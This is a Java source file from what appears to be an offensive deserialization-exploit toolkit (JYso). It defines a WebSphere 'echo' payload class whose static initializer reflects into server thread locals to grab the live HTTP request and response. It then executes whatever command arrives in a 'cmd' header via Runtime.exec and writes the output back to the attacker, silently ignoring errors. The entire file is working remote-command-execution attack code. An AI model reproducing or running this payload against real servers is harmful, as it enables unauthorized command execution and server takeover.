package com.qi4l.JYso.template.echoStatic;

import java.io.OutputStream;

import static com.qi4l.JYso.gadgets.Jackson3.getFieldValue;

public class websphereEcho {

    static {
        try {
            Class                   clazz = Thread.currentThread().getClass();
            java.lang.reflect.Field field = clazz.getDeclaredField("wsThreadLocals");
            field.setAccessible(true);
            Object obj = field.get(Thread.currentThread());

            Object[] obj_arr = (Object[]) obj;
            for (int i = 0; i < obj_arr.length; i++) {
                Object o = obj_arr[i];
                if (o == null) continue;

                if (o.getClass().getName().endsWith("WebContainerRequestState")) {
                    Object req  = o.getClass().getMethod("getCurrentThreadsIExtendedRequest", new Class[0]).invoke(o, new Object[0]);
                    Object resp = o.getClass().getMethod("getCurrentThreadsIExtendedResponse", new Class[0]).invoke(o, new Object[0]);

                    String cmd = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"cmd"});
                    if (cmd != null && !cmd.isEmpty()) {
                        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();

                        //java.io.PrintWriter printWriter = (java.io.PrintWriter) resp.getClass().getMethod("getWriter", new Class[0]).invoke(resp, new Object[0]);
                        //printWriter.println(res);

                        // 解决只读一次的问题
                        OutputStream outputStream = (OutputStream) getFieldValue(resp, "_bufferedOut");
                        outputStream.flush();
                        outputStream.write(res.getBytes());
                    }

                    break;
                }
            }
        } catch (Exception ignored) {
        }

    }
}
